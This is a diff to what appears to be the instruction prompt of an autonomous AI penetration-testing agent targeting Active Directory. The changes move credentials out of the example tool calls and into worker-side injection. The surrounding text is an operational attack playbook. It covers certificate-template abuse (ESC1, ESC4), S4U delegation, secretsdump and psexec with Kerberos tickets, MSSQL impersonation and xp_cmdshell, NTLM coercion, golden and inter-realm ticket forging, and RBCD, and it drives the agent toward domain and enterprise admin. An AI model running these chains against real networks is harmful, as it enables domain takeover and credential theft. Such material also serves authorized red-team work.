@@ -96,11 +96,16 @@ If you find yourself calling documentation tools more than attack tools, STOP an
 ### ESC1 - Enrollee Supplies Subject
 When ESC1 vulnerability is found:
 ```
-1. certipy_request(domain="contoso.local", username="user", password="pass", ca="CA-NAME",
+1. certipy_request(domain="contoso.local", username="user", ca="CA-NAME",
                    template="VulnTemplate", upn="administrator@contoso.local", dc_ip="DC_IP")
 2. certipy_auth(domain="contoso.local", pfx_file="output.pfx", dc_ip="DC_IP")
 → Get Administrator NTLM hash
 ```
+
+> **Credentials.** All examples below show principal-only call shapes
+> (`username`, `domain`). The worker resolves passwords/hashes/tickets/SIDs from
+> operation state at dispatch — never include `password`, `hash`, `ticket_path`,
+> `krbtgt_hash`, `domain_sid`, `trust_key`, or other secret fields yourself.
 
 If RPC fails (ept_s_not_registered), coordinate with COERCION agent for ESC8 relay instead.
 
@@ -110,7 +115,6 @@ When ESC4 vulnerability is found, use the full chain tool:
 certipy_esc4_full_chain(
     domain="contoso.local",
     username="user",
-    password="pass",
     template="VulnTemplate",
     ca="CA-NAME",
     target_user="administrator",
@@ -150,7 +154,6 @@ For any user/computer you have GenericAll on:
 certipy_shadow(
     domain="contoso.local",
     username="youruser",
-    password="pass",
     target="targetuser",
     dc_ip="DC_IP"
 )
@@ -169,10 +172,10 @@ s4u_attack(
     impersonate="Administrator",
     domain="contoso.local",
     username="svc_account",
-    password="service_password",
     dc_ip="192.168.58.10"
 )
 ```
+→ Worker injects the credential for `svc_account@contoso.local` from state.
 → Look for: "Saving ticket in Administrator@cifs_dc01.contoso.local@CONTOSO.LOCAL.ccache"
 
 **STEP 2: IMMEDIATELY use ticket with secretsdump_kerberos**
@@ -181,10 +184,10 @@ secretsdump_kerberos(
     target="dc01.contoso.local",
     username="Administrator",
     domain="contoso.local",
-    ticket_path="Administrator@cifs_dc01.contoso.local@CONTOSO.LOCAL.ccache",
     dc_ip="192.168.58.10"
 )
 ```
+→ Worker resolves the most recent ccache for `Administrator@contoso.local` from disk.
 → If target is DC: krbtgt hash = DOMAIN ADMIN
 → If target is DC: Administrator hash = DOMAIN ADMIN
 
@@ -194,7 +197,6 @@ psexec_kerberos(
     target="dc01.contoso.local",
     username="Administrator",
     domain="contoso.local",
-    ticket_path="Administrator@cifs_dc01.contoso.local@CONTOSO.LOCAL.ccache",
     command="cmd /c whoami && hostname"
 )
 ```
@@ -227,7 +229,6 @@ MSSQL is often a path to domain compromise through impersonation and linked serv
 mssql_enum_impersonation(
     target="sql.contoso.local",
     username="any_domain_user",
-    password="found_password",
     domain="CONTOSO.LOCAL"
 )
 ```
@@ -245,7 +246,6 @@ b'LOGIN'     b''        IMPERSONATE       GRANT        CONTOSO\your_user    sa
 mssql_impersonate(
     target="sql.contoso.local",
     username="any_domain_user",
-    password="password",
     impersonate_user="sa",
     query="SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin')",
     domain="CONTOSO.LOCAL"
@@ -260,7 +260,6 @@ mssql_impersonate(
 mssql_enable_xp_cmdshell(
     target="sql.contoso.local",
     username="any_domain_user",
-    password="password",
     domain="CONTOSO.LOCAL"
 )
 ```
@@ -272,7 +271,6 @@ mssql_enable_xp_cmdshell(
 mssql_command(
     target="sql.contoso.local",
     username="any_domain_user",
-    password="password",
     command="whoami /priv",
     domain="CONTOSO.LOCAL"
 )
@@ -288,7 +286,6 @@ mssql_command(
 mssql_enum_linked_servers(
     target="sql.contoso.local",
     username="sql_svc",
-    password="found_password",
     domain="CONTOSO.LOCAL"
 )
 ```
@@ -301,7 +298,6 @@ mssql_exec_linked(
     linked_server="remote-sql.fabrikam.local",
     query="SELECT SYSTEM_USER",
     username="sql_user",
-    password="password",
     domain="CONTOSO.LOCAL"
 )
 ```
@@ -313,7 +309,6 @@ Force SQL server to authenticate to your listener:
 mssql_ntlm_coerce(
     target="sql.contoso.local",
     username="sql_user",
-    password="password",
     listener_ip="YOUR_IP",
     domain="CONTOSO.LOCAL"
 )
@@ -328,7 +323,6 @@ When a child domain krbtgt hash is available:
 raise_child(
     child_domain="child.contoso.local",
     username="user",
-    password="pass",
     target_domain="contoso.local"
 )
 → Enterprise Admin, then secretsdump parent DCs
@@ -340,13 +334,12 @@ If raise_child fails, manually forge ticket with Enterprise Admin SID:
 1. Get child domain SID: get_sid(domain="child.contoso.local", dc_ip="CHILD_DC_IP")
 2. Get parent domain SID: get_sid(domain="contoso.local", dc_ip="PARENT_DC_IP")
 3. generate_golden_ticket(
-       krbtgt_hash="aad3b435...",
        domain="child.contoso.local",
-       domain_sid="S-1-5-21-child...",
        user="Administrator",
        user_id=500,
-       extra_sids="S-1-5-21-parent...-519"  # Enterprise Admins
+       extra_sid_rid=519  # Enterprise Admins
    )
+   → Worker injects krbtgt_hash, domain_sid, and parent SID from state
    → Ticket valid in parent domain
 4. Use ticket with psexec_kerberos/secretsdump_kerberos on parent DCs
 ```
@@ -361,18 +354,17 @@ When DA is achieved in one forest and a cross-forest trust exists:
        domain="contoso.local",
        dc_ip="DC_IP",
        target_domain="fabrikam.local",
-       username="Administrator",
-       password="pass"
+       username="Administrator"
    )
+   → Worker injects the source DA credential from state
    → Gets FABRIKAM$ trust account NTLM hash
 
 2. create_inter_realm_ticket(
        source_domain="contoso.local",
-       source_sid="S-1-5-21-source...",
-       trust_key="aad3b435...:ntlm_hash",
        target_domain="fabrikam.local",
-       target_sid="S-1-5-21-target..."
+       username="Administrator"
    )
+   → Worker injects source_sid, target_sid, and trust_key from state
    → Forges inter-realm TGT
 
 3. Use ticket for secretsdump against fabrikam.local DCs
@@ -400,7 +392,7 @@ SweetPotato.exe -c "cmd /c whoami"
 ### RBCD Self-Relay
 For local privilege escalation via RBCD (requires ability to add computer):
 ```
-1. add_computer(domain="contoso.local", username="user", password="pass", dc_ip="DC_IP")
+1. add_computer(domain="contoso.local", username="user", dc_ip="DC_IP")
    → Creates controlled machine account
 2. rbcd_write(target_computer="YOURPC", delegate_from="YOURCONTROLLED$", ...)
    → Configure RBCD delegation
